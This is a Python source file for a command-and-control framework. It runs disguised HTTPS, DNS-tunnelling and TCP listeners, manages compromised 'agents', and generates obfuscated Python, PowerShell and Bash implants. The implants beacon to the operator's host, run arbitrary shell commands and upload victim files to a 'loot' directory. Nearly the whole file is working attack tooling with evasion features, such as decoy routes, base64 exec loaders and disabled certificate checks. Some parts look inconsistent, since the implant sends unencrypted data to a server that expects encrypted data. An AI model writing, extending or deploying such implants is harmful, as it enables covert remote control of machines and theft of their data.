"""
Command & Control (C2) Framework Integration
Multi-channel covert communication and agent management
"""

import asyncio
import aiohttp
import json
import base64
import hashlib
import hmac
import os
import socket
import ssl
import time
import struct
import random
import string
from typing import Dict, List, Optional, Any, Callable, Tuple
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import threading
import queue


class ChannelType(Enum):
    """C2 communication channel types"""
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    ICMP = "icmp"
    SMB = "smb"
    TCP = "tcp"
    UDP = "udp"
    WEBSOCKET = "websocket"
    DOH = "doh"  # DNS over HTTPS
    SLACK = "slack"
    DISCORD = "discord"
    TELEGRAM = "telegram"


class AgentStatus(Enum):
    """Agent status states"""
    ACTIVE = "active"
    DORMANT = "dormant"
    DEAD = "dead"
    CHECKING_IN = "checking_in"
    EXECUTING = "executing"
    EXFILTRATING = "exfiltrating"


class TaskType(Enum):
    """Types of tasks that can be assigned to agents"""
    SHELL = "shell"
    POWERSHELL = "powershell"
    PYTHON = "python"
    DOWNLOAD = "download"
    UPLOAD = "upload"
    SCREENSHOT = "screenshot"
    KEYLOG = "keylog"
    PROCESS_LIST = "process_list"
    FILE_BROWSE = "file_browse"
    REGISTRY = "registry"
    PERSIST = "persist"
    MIGRATE = "migrate"
    PIVOT = "pivot"
    EXFIL = "exfil"
    SELF_DESTRUCT = "self_destruct"


@dataclass
class C2Agent:
    """Represents a deployed C2 agent"""
    agent_id: str
    hostname: str
    username: str
    ip_address: str
    os_info: str
    architecture: str
    process_id: int
    process_name: str
    integrity_level: str
    channel: ChannelType
    status: AgentStatus = AgentStatus.ACTIVE
    last_seen: str = field(default_factory=lambda: datetime.now().isoformat())
    first_seen: str = field(default_factory=lambda: datetime.now().isoformat())
    sleep_time: int = 60
    jitter: float = 0.2
    encryption_key: str = ""
    tasks_pending: List[str] = field(default_factory=list)
    tasks_completed: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class C2Task:
    """Represents a task to be executed by an agent"""
    task_id: str
    agent_id: str
    task_type: TaskType
    command: str
    arguments: Dict[str, Any] = field(default_factory=dict)
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    executed_at: Optional[str] = None
    completed_at: Optional[str] = None
    result: Optional[str] = None
    error: Optional[str] = None
    status: str = "pending"


@dataclass
class C2Listener:
    """Represents a C2 listener"""
    listener_id: str
    name: str
    channel: ChannelType
    host: str
    port: int
    ssl_enabled: bool = False
    running: bool = False
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    agents_connected: List[str] = field(default_factory=list)
    configuration: Dict[str, Any] = field(default_factory=dict)


class C2Server:
    """
    Command & Control Server
    Manages agents, listeners, and task distribution
    """
    
    def __init__(self, master_key: Optional[str] = None):
        """Initialize C2 server with encryption"""
        # Generate or use provided master key
        if master_key:
            self.master_key = master_key.encode()
        else:
            self.master_key = Fernet.generate_key()
            
        # Initialize Fernet cipher
        self.cipher = Fernet(self.master_key)
        
        # Storage
        self.agents: Dict[str, C2Agent] = {}
        self.tasks: Dict[str, C2Task] = {}
        self.listeners: Dict[str, C2Listener] = {}
        
        # Task queue
        self.task_queue: queue.Queue = queue.Queue()
        
        # Callbacks
        self.callbacks: Dict[str, List[Callable]] = {
            "agent_connected": [],
            "agent_disconnected": [],
            "task_completed": [],
            "data_exfiltrated": [],
        }
        
        # Running state
        self._running = False
        self._listener_tasks: List[asyncio.Task] = []
        
    def generate_agent_id(self) -> str:
        """Generate unique agent ID"""
        return hashlib.sha256(
            f"{time.time()}{random.random()}".encode()
        ).hexdigest()[:16]
        
    def generate_task_id(self) -> str:
        """Generate unique task ID"""
        return hashlib.sha256(
            f"task_{time.time()}{random.random()}".encode()
        ).hexdigest()[:12]
        
    def encrypt_data(self, data: bytes) -> bytes:
        """Encrypt data for transmission"""
        return self.cipher.encrypt(data)
        
    def decrypt_data(self, data: bytes) -> bytes:
        """Decrypt received data"""
        return self.cipher.decrypt(data)
        
    # ==================== Agent Management ====================
    
    def register_agent(self, agent_info: Dict[str, Any]) -> C2Agent:
        """Register a new agent"""
        agent_id = self.generate_agent_id()
        
        agent = C2Agent(
            agent_id=agent_id,
            hostname=agent_info.get("hostname", "unknown"),
            username=agent_info.get("username", "unknown"),
            ip_address=agent_info.get("ip_address", "0.0.0.0"),
            os_info=agent_info.get("os_info", "unknown"),
            architecture=agent_info.get("architecture", "x64"),
            process_id=agent_info.get("process_id", 0),
            process_name=agent_info.get("process_name", "unknown"),
            integrity_level=agent_info.get("integrity_level", "medium"),
            channel=ChannelType(agent_info.get("channel", "https")),
            encryption_key=Fernet.generate_key().decode(),
        )
        
        self.agents[agent_id] = agent
        
        # Trigger callbacks
        for callback in self.callbacks["agent_connected"]:
            try:
                callback(agent)
            except Exception:
                pass
                
        return agent
        
    def update_agent_checkin(self, agent_id: str) -> Optional[C2Agent]:
        """Update agent last seen timestamp"""
        if agent_id in self.agents:
            self.agents[agent_id].last_seen = datetime.now().isoformat()
            self.agents[agent_id].status = AgentStatus.ACTIVE
            return self.agents[agent_id]
        return None
        
    def get_agent(self, agent_id: str) -> Optional[C2Agent]:
        """Get agent by ID"""
        return self.agents.get(agent_id)
        
    def list_agents(self, status: Optional[AgentStatus] = None) -> List[C2Agent]:
        """List all agents, optionally filtered by status"""
        agents = list(self.agents.values())
        if status:
            agents = [a for a in agents if a.status == status]
        return agents
        
    def kill_agent(self, agent_id: str) -> bool:
        """Send kill command to agent"""
        if agent_id in self.agents:
            self.queue_task(agent_id, TaskType.SELF_DESTRUCT, "exit")
            self.agents[agent_id].status = AgentStatus.DEAD
            return True
        return False
        
    # ==================== Task Management ====================
    
    def queue_task(self, 
                   agent_id: str, 
                   task_type: TaskType,
                   command: str,
                   arguments: Optional[Dict[str, Any]] = None) -> Optional[C2Task]:
        """Queue a task for an agent"""
        if agent_id not in self.agents:
            return None
            
        task = C2Task(
            task_id=self.generate_task_id(),
            agent_id=agent_id,
            task_type=task_type,
            command=command,
            arguments=arguments or {},
        )
        
        self.tasks[task.task_id] = task
        self.agents[agent_id].tasks_pending.append(task.task_id)
        
        return task
        
    def get_pending_tasks(self, agent_id: str) -> List[C2Task]:
        """Get pending tasks for an agent"""
        if agent_id not in self.agents:
            return []
            
        task_ids = self.agents[agent_id].tasks_pending
        return [self.tasks[tid] for tid in task_ids if tid in self.tasks]
        
    def complete_task(self, 
                      task_id: str, 
                      result: str, 
                      error: Optional[str] = None) -> bool:
        """Mark a task as completed"""
        if task_id not in self.tasks:
            return False
            
        task = self.tasks[task_id]
        task.completed_at = datetime.now().isoformat()
        task.result = result
        task.error = error
        task.status = "completed" if not error else "failed"
        
        # Update agent
        if task.agent_id in self.agents:
            agent = self.agents[task.agent_id]
            if task_id in agent.tasks_pending:
                agent.tasks_pending.remove(task_id)
            agent.tasks_completed.append(task_id)
            
        # Trigger callbacks
        for callback in self.callbacks["task_completed"]:
            try:
                callback(task)
            except Exception:
                pass
                
        return True
        
    # ==================== Listener Management ====================
    
    async def create_listener(self,
                              name: str,
                              channel: ChannelType,
                              host: str = "0.0.0.0",
                              port: int = 8443,
                              ssl_enabled: bool = True,
                              **config) -> C2Listener:
        """Create a new listener"""
        listener_id = hashlib.sha256(
            f"{name}{channel.value}{port}".encode()
        ).hexdigest()[:12]
        
        listener = C2Listener(
            listener_id=listener_id,
            name=name,
            channel=channel,
            host=host,
            port=port,
            ssl_enabled=ssl_enabled,
            configuration=config,
        )
        
        self.listeners[listener_id] = listener
        return listener
        
    async def start_listener(self, listener_id: str) -> bool:
        """Start a listener"""
        if listener_id not in self.listeners:
            return False
            
        listener = self.listeners[listener_id]
        
        if listener.running:
            return True
            
        # Start based on channel type
        if listener.channel in [ChannelType.HTTP, ChannelType.HTTPS]:
            task = asyncio.create_task(
                self._run_http_listener(listener)
            )
            self._listener_tasks.append(task)
            
        elif listener.channel == ChannelType.DNS:
            task = asyncio.create_task(
                self._run_dns_listener(listener)
            )
            self._listener_tasks.append(task)
            
        elif listener.channel == ChannelType.TCP:
            task = asyncio.create_task(
                self._run_tcp_listener(listener)
            )
            self._listener_tasks.append(task)
            
        listener.running = True
        return True
        
    async def stop_listener(self, listener_id: str) -> bool:
        """Stop a listener"""
        if listener_id not in self.listeners:
            return False
            
        self.listeners[listener_id].running = False
        return True
        
    # ==================== HTTP/S Listener ====================
    
    async def _run_http_listener(self, listener: C2Listener):
        """Run HTTP/HTTPS listener"""
        from aiohttp import web
        
        async def handle_beacon(request: web.Request) -> web.Response:
            """Handle agent beacon/check-in"""
            try:
                data = await request.read()
                
                # Decrypt beacon data
                decrypted = self.decrypt_data(data)
                beacon_data = json.loads(decrypted)
                
                agent_id = beacon_data.get("agent_id")
                
                if agent_id and agent_id in self.agents:
                    # Update check-in
                    self.update_agent_checkin(agent_id)
                    
                    # Get pending tasks
                    tasks = self.get_pending_tasks(agent_id)
                    task_data = [
                        {
                            "task_id": t.task_id,
                            "type": t.task_type.value,
                            "command": t.command,
                            "arguments": t.arguments,
                        }
                        for t in tasks
                    ]
                    
                    # Encrypt response
                    response_data = json.dumps({"tasks": task_data}).encode()
                    encrypted = self.encrypt_data(response_data)
                    
                    return web.Response(body=encrypted, status=200)
                else:
                    # New agent registration
                    agent = self.register_agent(beacon_data)
                    
                    response_data = json.dumps({
                        "agent_id": agent.agent_id,
                        "encryption_key": agent.encryption_key,
                        "sleep_time": agent.sleep_time,
                        "jitter": agent.jitter,
                    }).encode()
                    encrypted = self.encrypt_data(response_data)
                    
                    return web.Response(body=encrypted, status=201)
                    
            except Exception as e:
                return web.Response(status=404)  # Look like normal 404
                
        async def handle_result(request: web.Request) -> web.Response:
            """Handle task result submission"""
            try:
                data = await request.read()
                decrypted = self.decrypt_data(data)
                result_data = json.loads(decrypted)
                
                task_id = result_data.get("task_id")
                result = result_data.get("result", "")
                error = result_data.get("error")
                
                self.complete_task(task_id, result, error)
                
                return web.Response(status=200)
                
            except Exception:
                return web.Response(status=404)
                
        async def handle_upload(request: web.Request) -> web.Response:
            """Handle file upload from agent"""
            try:
                data = await request.read()
                decrypted = self.decrypt_data(data)
                upload_data = json.loads(decrypted)
                
                filename = upload_data.get("filename", "unknown")
                content = base64.b64decode(upload_data.get("content", ""))
                agent_id = upload_data.get("agent_id")
                
                # Save file
                save_path = f"loot/{agent_id}/{filename}"
                os.makedirs(os.path.dirname(save_path), exist_ok=True)
                with open(save_path, 'wb') as f:
                    f.write(content)
                    
                # Trigger callback
                for callback in self.callbacks["data_exfiltrated"]:
                    try:
                        callback(agent_id, filename, len(content))
                    except Exception:
                        pass
                        
                return web.Response(status=200)
                
            except Exception:
                return web.Response(status=404)
                
        # Create app
        app = web.Application()
        
        # Use innocent-looking URLs
        app.router.add_post('/api/v1/status', handle_beacon)
        app.router.add_post('/api/v1/metrics', handle_result)
        app.router.add_post('/api/v1/data', handle_upload)
        
        # Also add decoy routes
        app.router.add_get('/', lambda r: web.Response(text="OK"))
        app.router.add_get('/health', lambda r: web.Response(text="healthy"))
        
        # Run server
        runner = web.AppRunner(app)
        await runner.setup()
        
        if listener.ssl_enabled:
            ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            # In production, load real certs
            site = web.TCPSite(runner, listener.host, listener.port, ssl_context=ssl_context)
        else:
            site = web.TCPSite(runner, listener.host, listener.port)
            
        await site.start()
        
        while listener.running:
            await asyncio.sleep(1)
            
        await runner.cleanup()
        
    # ==================== DNS Listener ====================
    
    async def _run_dns_listener(self, listener: C2Listener):
        """Run DNS tunneling listener"""
        
        class DNSProtocol(asyncio.DatagramProtocol):
            def __init__(self, c2_server):
                self.c2 = c2_server
                self.transport = None
                
            def connection_made(self, transport):
                self.transport = transport
                
            def datagram_received(self, data, addr):
                # Parse DNS query
                try:
                    # Simple DNS parsing
                    query_name = self._extract_query_name(data)
                    
                    # Extract encoded data from subdomain
                    if query_name:
                        parts = query_name.split('.')
                        if len(parts) >= 2:
                            encoded_data = parts[0]
                            
                            # Decode and process
                            try:
                                decoded = base64.b32decode(encoded_data.upper())
                                # Process beacon/command
                                # ...
                            except Exception:
                                pass
                                
                    # Send DNS response
                    response = self._build_dns_response(data)
                    self.transport.sendto(response, addr)
                    
                except Exception:
                    pass
                    
            def _extract_query_name(self, data: bytes) -> str:
                """Extract domain name from DNS query"""
                try:
                    offset = 12  # Skip header
                    labels = []
                    
                    while True:
                        length = data[offset]
                        if length == 0:
                            break
                        offset += 1
                        labels.append(data[offset:offset + length].decode())
                        offset += length
                        
                    return '.'.join(labels)
                except Exception:
                    return ""
                    
            def _build_dns_response(self, query: bytes) -> bytes:
                """Build DNS response"""
                # Simple A record response
                response = bytearray(query)
                
                # Set response flags
                response[2] = 0x81  # Response, recursion desired
                response[3] = 0x80  # Recursion available
                
                # Set answer count
                response[6] = 0x00
                response[7] = 0x01
                
                # Add answer (pointer to name + A record)
                answer = b'\xc0\x0c'  # Pointer to name
                answer += b'\x00\x01'  # Type A
                answer += b'\x00\x01'  # Class IN
                answer += b'\x00\x00\x00\x3c'  # TTL 60
                answer += b'\x00\x04'  # Data length
                answer += b'\x7f\x00\x00\x01'  # IP: 127.0.0.1
                
                return bytes(response) + answer
                
        # Create UDP server for DNS
        loop = asyncio.get_event_loop()
        transport, protocol = await loop.create_datagram_endpoint(
            lambda: DNSProtocol(self),
            local_addr=(listener.host, listener.port)
        )
        
        while listener.running:
            await asyncio.sleep(1)
            
        transport.close()
        
    # ==================== TCP Listener ====================
    
    async def _run_tcp_listener(self, listener: C2Listener):
        """Run raw TCP listener"""
        
        async def handle_client(reader: asyncio.StreamReader, 
                               writer: asyncio.StreamWriter):
            """Handle TCP client connection"""
            addr = writer.get_extra_info('peername')
            
            try:
                while True:
                    # Read length-prefixed data
                    length_data = await reader.read(4)
                    if not length_data:
                        break
                        
                    length = struct.unpack('>I', length_data)[0]
                    data = await reader.read(length)
                    
                    if not data:
                        break
                        
                    # Decrypt and process
                    try:
                        decrypted = self.decrypt_data(data)
                        message = json.loads(decrypted)
                        
                        # Process message
                        response = await self._process_tcp_message(message)
                        
                        # Encrypt and send response
                        response_data = json.dumps(response).encode()
                        encrypted = self.encrypt_data(response_data)
                        
                        # Send with length prefix
                        writer.write(struct.pack('>I', len(encrypted)))
                        writer.write(encrypted)
                        await writer.drain()
                        
                    except Exception:
                        pass
                        
            except Exception:
                pass
            finally:
                writer.close()
                await writer.wait_closed()
                
        # Start server
        if listener.ssl_enabled:
            ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            server = await asyncio.start_server(
                handle_client,
                listener.host,
                listener.port,
                ssl=ssl_context
            )
        else:
            server = await asyncio.start_server(
                handle_client,
                listener.host,
                listener.port
            )
            
        async with server:
            while listener.running:
                await asyncio.sleep(1)
                
    async def _process_tcp_message(self, message: Dict[str, Any]) -> Dict[str, Any]:
        """Process TCP message from agent"""
        msg_type = message.get("type")
        
        if msg_type == "beacon":
            agent_id = message.get("agent_id")
            if agent_id and agent_id in self.agents:
                self.update_agent_checkin(agent_id)
                tasks = self.get_pending_tasks(agent_id)
                return {
                    "type": "tasks",
                    "tasks": [
                        {
                            "task_id": t.task_id,
                            "type": t.task_type.value,
                            "command": t.command,
                        }
                        for t in tasks
                    ]
                }
            else:
                agent = self.register_agent(message.get("info", {}))
                return {
                    "type": "registered",
                    "agent_id": agent.agent_id,
                    "encryption_key": agent.encryption_key,
                }
                
        elif msg_type == "result":
            self.complete_task(
                message.get("task_id"),
                message.get("result"),
                message.get("error")
            )
            return {"type": "ack"}
            
        return {"type": "error", "message": "Unknown message type"}
        
    # ==================== Payload Generation ====================
    
    def generate_payload(self,
                         platform: str,
                         channel: ChannelType,
                         listener_host: str,
                         listener_port: int,
                         format: str = "python",
                         obfuscate: bool = True) -> str:
        """Generate agent payload"""
        
        if format == "python":
            return self._generate_python_payload(
                channel, listener_host, listener_port, obfuscate
            )
        elif format == "powershell":
            return self._generate_powershell_payload(
                channel, listener_host, listener_port, obfuscate
            )
        elif format == "bash":
            return self._generate_bash_payload(
                channel, listener_host, listener_port
            )
        else:
            raise ValueError(f"Unsupported format: {format}")
            
    def _generate_python_payload(self,
                                  channel: ChannelType,
                                  host: str,
                                  port: int,
                                  obfuscate: bool) -> str:
        """Generate Python agent payload"""
        
        payload = f'''
import socket
import ssl
import json
import base64
import subprocess
import os
import platform
import time
import random
import struct

class Agent:
    def __init__(self):
        self.host = "{host}"
        self.port = {port}
        self.agent_id = None
        self.encryption_key = None
        self.sleep_time = 60
        self.jitter = 0.2
        
    def get_info(self):
        return {{
            "hostname": socket.gethostname(),
            "username": os.getenv("USER", os.getenv("USERNAME", "unknown")),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "os_info": f"{{platform.system()}} {{platform.release()}}",
            "architecture": platform.machine(),
            "process_id": os.getpid(),
            "process_name": __file__,
            "integrity_level": "medium",
            "channel": "{channel.value}",
        }}
        
    def beacon(self):
        """Check in with C2 server"""
        try:
            {"ssl_code = '''context = ssl.create_default_context(); context.check_hostname = False; context.verify_mode = ssl.CERT_NONE'''" if channel == ChannelType.HTTPS else ""}
            
            import urllib.request
            url = f"{'https' if channel == ChannelType.HTTPS else 'http'}://{{self.host}}:{{self.port}}/api/v1/status"
            
            data = {{
                "agent_id": self.agent_id,
                **self.get_info()
            }}
            
            req = urllib.request.Request(
                url,
                data=json.dumps(data).encode(),
                method='POST'
            )
            
            with urllib.request.urlopen(req, timeout=30) as response:
                result = json.loads(response.read().decode())
                
                if "agent_id" in result and not self.agent_id:
                    self.agent_id = result["agent_id"]
                    self.encryption_key = result.get("encryption_key")
                    self.sleep_time = result.get("sleep_time", 60)
                    self.jitter = result.get("jitter", 0.2)
                    
                return result.get("tasks", [])
                
        except Exception as e:
            return []
            
    def execute_task(self, task):
        """Execute a task"""
        task_type = task.get("type")
        command = task.get("command")
        
        try:
            if task_type == "shell":
                result = subprocess.check_output(
                    command,
                    shell=True,
                    stderr=subprocess.STDOUT,
                    timeout=300
                ).decode()
            elif task_type == "python":
                exec_globals = {{"__builtins__": __builtins__}}
                exec(command, exec_globals)
                result = str(exec_globals.get("result", "executed"))
            elif task_type == "download":
                # Download file from URL
                import urllib.request
                urllib.request.urlretrieve(command, task.get("arguments", {{}}).get("path", "/tmp/download"))
                result = "downloaded"
            elif task_type == "upload":
                with open(command, 'rb') as f:
                    content = base64.b64encode(f.read()).decode()
                self.upload_file(command, content)
                result = "uploaded"
            elif task_type == "process_list":
                result = subprocess.check_output("ps aux", shell=True).decode()
            elif task_type == "self_destruct":
                os._exit(0)
            else:
                result = f"Unknown task type: {{task_type}}"
                
            return {{"task_id": task["task_id"], "result": result}}
            
        except Exception as e:
            return {{"task_id": task["task_id"], "error": str(e)}}
            
    def send_result(self, result):
        """Send task result back"""
        try:
            import urllib.request
            url = f"{'https' if channel == ChannelType.HTTPS else 'http'}://{{self.host}}:{{self.port}}/api/v1/metrics"
            
            req = urllib.request.Request(
                url,
                data=json.dumps(result).encode(),
                method='POST'
            )
            
            with urllib.request.urlopen(req, timeout=30):
                pass
                
        except Exception:
            pass
            
    def upload_file(self, filename, content):
        """Upload file to C2"""
        try:
            import urllib.request
            url = f"{'https' if channel == ChannelType.HTTPS else 'http'}://{{self.host}}:{{self.port}}/api/v1/data"
            
            data = {{
                "agent_id": self.agent_id,
                "filename": os.path.basename(filename),
                "content": content,
            }}
            
            req = urllib.request.Request(
                url,
                data=json.dumps(data).encode(),
                method='POST'
            )
            
            with urllib.request.urlopen(req, timeout=30):
                pass
                
        except Exception:
            pass
            
    def run(self):
        """Main loop"""
        while True:
            try:
                tasks = self.beacon()
                
                for task in tasks:
                    result = self.execute_task(task)
                    self.send_result(result)
                    
            except Exception:
                pass
                
            # Sleep with jitter
            jitter_amount = self.sleep_time * self.jitter * random.random()
            time.sleep(self.sleep_time + jitter_amount)

if __name__ == "__main__":
    agent = Agent()
    agent.run()
'''
        
        if obfuscate:
            payload = self._obfuscate_python(payload)
            
        return payload
        
    def _obfuscate_python(self, code: str) -> str:
        """Basic Python obfuscation"""
        # Base64 encode
        encoded = base64.b64encode(code.encode()).decode()
        
        # Create loader
        loader = f'''
import base64
exec(base64.b64decode("{encoded}"))
'''
        return loader
        
    def _generate_powershell_payload(self,
                                      channel: ChannelType,
                                      host: str,
                                      port: int,
                                      obfuscate: bool) -> str:
        """Generate PowerShell agent payload"""
        
        payload = f'''
$Global:AgentId = $null
$Global:C2Host = "{host}"
$Global:C2Port = {port}
$Global:SleepTime = 60
$Global:Jitter = 0.2

function Get-SystemInfo {{
    return @{{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        ip_address = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{ $_.InterfaceAlias -ne 'Loopback' }} | Select-Object -First 1).IPAddress
        os_info = [System.Environment]::OSVersion.VersionString
        architecture = $env:PROCESSOR_ARCHITECTURE
        process_id = $PID
        process_name = (Get-Process -Id $PID).Name
        integrity_level = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{ "high" }} else {{ "medium" }}
        channel = "{channel.value}"
    }}
}}

function Invoke-Beacon {{
    try {{
        $uri = "{'https' if channel == ChannelType.HTTPS else 'http'}://$Global:C2Host`:$Global:C2Port/api/v1/status"
        
        $body = @{{
            agent_id = $Global:AgentId
        }} + (Get-SystemInfo)
        
        $response = Invoke-RestMethod -Uri $uri -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
        
        if ($response.agent_id -and -not $Global:AgentId) {{
            $Global:AgentId = $response.agent_id
            $Global:SleepTime = $response.sleep_time
            $Global:Jitter = $response.jitter
        }}
        
        return $response.tasks
    }} catch {{
        return @()
    }}
}}

function Invoke-Task {{
    param($Task)
    
    try {{
        switch ($Task.type) {{
            "shell" {{
                $result = cmd.exe /c $Task.command 2>&1 | Out-String
            }}
            "powershell" {{
                $result = Invoke-Expression $Task.command 2>&1 | Out-String
            }}
            "process_list" {{
                $result = Get-Process | Select-Object Id, Name, CPU | Format-Table | Out-String
            }}
            "self_destruct" {{
                exit
            }}
            default {{
                $result = "Unknown task type"
            }}
        }}
        
        return @{{ task_id = $Task.task_id; result = $result }}
    }} catch {{
        return @{{ task_id = $Task.task_id; error = $_.Exception.Message }}
    }}
}}

function Send-Result {{
    param($Result)
    
    try {{
        $uri = "{'https' if channel == ChannelType.HTTPS else 'http'}://$Global:C2Host`:$Global:C2Port/api/v1/metrics"
        Invoke-RestMethod -Uri $uri -Method Post -Body ($Result | ConvertTo-Json) -ContentType 'application/json'
    }} catch {{}}
}}

while ($true) {{
    try {{
        $tasks = Invoke-Beacon
        
        foreach ($task in $tasks) {{
            $result = Invoke-Task -Task $task
            Send-Result -Result $result
        }}
    }} catch {{}}
    
    $jitterAmount = $Global:SleepTime * $Global:Jitter * (Get-Random -Minimum 0 -Maximum 1.0)
    Start-Sleep -Seconds ($Global:SleepTime + $jitterAmount)
}}
'''
        
        if obfuscate:
            # Base64 encode for execution
            encoded = base64.b64encode(payload.encode('utf-16-le')).decode()
            payload = f'powershell -enc {encoded}'
            
        return payload
        
    def _generate_bash_payload(self,
                               channel: ChannelType,
                               host: str,
                               port: int) -> str:
        """Generate Bash agent payload"""
        
        payload = f'''#!/bin/bash

C2_HOST="{host}"
C2_PORT="{port}"
AGENT_ID=""
SLEEP_TIME=60

get_info() {{
    echo '{{"hostname":"'$(hostname)'","username":"'$(whoami)'","ip_address":"'$(hostname -I | awk '{{print $1}}')'","os_info":"'$(uname -a)'","process_id":"'$$'","channel":"{channel.value}"}}'
}}

beacon() {{
    local data=$(get_info)
    if [ -n "$AGENT_ID" ]; then
        data=$(echo $data | sed 's/{{/{{\"agent_id\":\"'$AGENT_ID'\",/')
    fi
    
    response=$(curl -s -X POST "{'https' if channel == ChannelType.HTTPS else 'http'}://$C2_HOST:$C2_PORT/api/v1/status" \
        -H "Content-Type: application/json" \
        -d "$data" {'--insecure' if channel == ChannelType.HTTPS else ''})
    
    if [ -z "$AGENT_ID" ]; then
        AGENT_ID=$(echo $response | grep -o '"agent_id":"[^"]*"' | cut -d'"' -f4)
    fi
    
    echo $response
}}

execute_task() {{
    local task_type=$(echo $1 | grep -o '"type":"[^"]*"' | cut -d'"' -f4)
    local command=$(echo $1 | grep -o '"command":"[^"]*"' | cut -d'"' -f4)
    local task_id=$(echo $1 | grep -o '"task_id":"[^"]*"' | cut -d'"' -f4)
    
    case $task_type in
        "shell")
            result=$(eval "$command" 2>&1)
            ;;
        "self_destruct")
            exit 0
            ;;
        *)
            result="Unknown task type"
            ;;
    esac
    
    # Send result
    curl -s -X POST "{'https' if channel == ChannelType.HTTPS else 'http'}://$C2_HOST:$C2_PORT/api/v1/metrics" \
        -H "Content-Type: application/json" \
        -d '{{"task_id":"'$task_id'","result":"'"$(echo $result | base64)"'"}}' {'--insecure' if channel == ChannelType.HTTPS else ''}
}}

while true; do
    response=$(beacon)
    
    # Parse and execute tasks
    # (simplified - real implementation would use jq)
    
    sleep $SLEEP_TIME
done
'''
        
        return payload


class C2Manager:
    """
    High-level C2 management interface
    """
    
    def __init__(self):
        self.server = C2Server()
        
    async def setup(self, 
                    listener_config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Setup C2 infrastructure"""
        
        results = {
            "master_key": self.server.master_key.decode(),
            "listeners": [],
        }
        
        # Create default listener if no config provided
        if not listener_config:
            listener_config = {
                "name": "default-https",
                "channel": ChannelType.HTTPS,
                "host": "0.0.0.0",
                "port": 8443,
                "ssl_enabled": True,
            }
            
        listener = await self.server.create_listener(**listener_config)
        await self.server.start_listener(listener.listener_id)
        
        results["listeners"].append({
            "id": listener.listener_id,
            "name": listener.name,
            "channel": listener.channel.value,
            "port": listener.port,
        })
        
        return results
        
    def generate_agent(self,
                       platform: str = "linux",
                       format: str = "python",
                       listener_id: Optional[str] = None) -> str:
        """Generate agent payload"""
        
        # Get listener info
        if listener_id:
            listener = self.server.listeners.get(listener_id)
        else:
            # Use first listener
            listener = list(self.server.listeners.values())[0] if self.server.listeners else None
            
        if not listener:
            raise ValueError("No listener available")
            
        return self.server.generate_payload(
            platform=platform,
            channel=listener.channel,
            listener_host=listener.host,
            listener_port=listener.port,
            format=format,
            obfuscate=True
        )
        
    def list_agents(self) -> List[Dict[str, Any]]:
        """List all agents"""
        return [
            {
                "agent_id": a.agent_id,
                "hostname": a.hostname,
                "username": a.username,
                "ip_address": a.ip_address,
                "os_info": a.os_info,
                "status": a.status.value,
                "last_seen": a.last_seen,
            }
            for a in self.server.list_agents()
        ]
        
    def interact(self, agent_id: str, command: str) -> Optional[str]:
        """Send command to agent and wait for result"""
        task = self.server.queue_task(
            agent_id,
            TaskType.SHELL,
            command
        )
        
        if task:
            return task.task_id
        return None


if __name__ == "__main__":
    async def main():
        print("="*60)
        print("C2 Framework - Command & Control Server")
        print("="*60)
        
        manager = C2Manager()
        
        # Setup server
        result = await manager.setup({
            "name": "main-listener",
            "channel": ChannelType.HTTPS,
            "host": "0.0.0.0",
            "port": 8443,
        })
        
        print(f"\n[+] C2 Server started")
        print(f"[+] Master Key: {result['master_key'][:20]}...")
        print(f"[+] Listeners: {len(result['listeners'])}")
        
        for listener in result["listeners"]:
            print(f"    - {listener['name']} ({listener['channel']}) on port {listener['port']}")
            
        # Generate sample payload
        print("\n[*] Sample Python payload:")
        payload = manager.generate_agent(platform="linux", format="python")
        print(payload[:200] + "...")
        
        # Keep running
        print("\n[*] Waiting for agents...")
        while True:
            await asyncio.sleep(5)
            agents = manager.list_agents()
            if agents:
                print(f"[+] Active agents: {len(agents)}")
                for agent in agents:
                    print(f"    - {agent['hostname']} ({agent['ip_address']})")
                    
    asyncio.run(main())
